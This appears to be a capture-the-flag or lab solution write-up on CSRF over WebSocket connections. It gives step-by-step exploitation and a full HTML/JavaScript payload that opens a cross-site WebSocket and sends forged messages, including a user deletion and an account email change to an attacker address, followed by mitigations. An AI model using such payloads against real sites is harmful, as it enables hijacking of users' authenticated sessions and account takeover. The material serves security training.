Level 20 Solution: CSRF in WebSocket Connections

Challenge Overview

This challenge demonstrates how to exploit CSRF vulnerabilities in WebSocket connections and real-time communication systems that lack proper origin validation.

Tools Required

Primary Tools: Burp Suite (WebSocket support), Browser Developer Tools, Custom JavaScript

Skills: WebSocket CSRF exploitation, Real-time communication security, Origin validation bypass

Step-by-Step Solution

  1. Analyze WebSocket Endpoint: Identify the WebSocket connection endpoint and message format
  2. Test Origin Validation: Check if the server validates the Origin header for WebSocket connections
  3. Craft WebSocket CSRF: Create a malicious page that establishes a WebSocket connection
  4. Message Injection: Send unauthorized messages through the WebSocket connection
  5. Real-time Exploitation: Execute real-time actions like sending messages or updating data
  6. Verify Impact: Confirm that unauthorized actions were performed successfully
Key Insight: WebSocket CSRF attacks bypass traditional CSRF protections because WebSockets don't follow the same-origin policy by default.

WebSocket CSRF Payload

<!-- WebSocket CSRF Attack -->
<html>
<body>
    <h3>Loading chat...</h3>

    <script>
    // Establish WebSocket connection to target
    const ws = new WebSocket('ws://target.com/csrf/level20/chat');

    ws.onopen = function() {
        console.log('WebSocket connection established');

        // Send unauthorized messages
        ws.send(JSON.stringify({
            type: 'message',
            content: 'CSRF attack via WebSocket!',
            recipient: 'admin'
        }));

        // Send admin command
        ws.send(JSON.stringify({
            type: 'admin_command',
            action: 'delete_user',
            target_user: 'victim123'
        }));

        // Send sensitive data modification
        ws.send(JSON.stringify({
            type: 'update_profile',
            user_id: 'victim123',
            new_email: 'attacker@evil.com'
        }));
    };

    ws.onmessage = function(event) {
        console.log('Response:', event.data);
    };
    </script>
</body>
</html>

Security Impact

WebSocket CSRF vulnerabilities allow attackers to:

  • Send unauthorized real-time messages on behalf of authenticated users
  • Execute admin commands through WebSocket connections
  • Modify user data in real-time applications
  • Bypass traditional CSRF protections that only cover HTTP requests
  • Perform persistent attacks through long-lived WebSocket connections

Mitigation Strategies

  • Origin Header Validation: Always validate the Origin header for WebSocket connections
  • Authentication Tokens: Require authentication tokens in WebSocket messages
  • Connection Authorization: Implement proper authorization checks during WebSocket handshake
  • Message Validation: Validate all incoming WebSocket messages and their sources
  • Rate Limiting: Implement rate limiting for WebSocket connections and messages
  • Secure WebSocket (WSS): Always use encrypted WebSocket connections
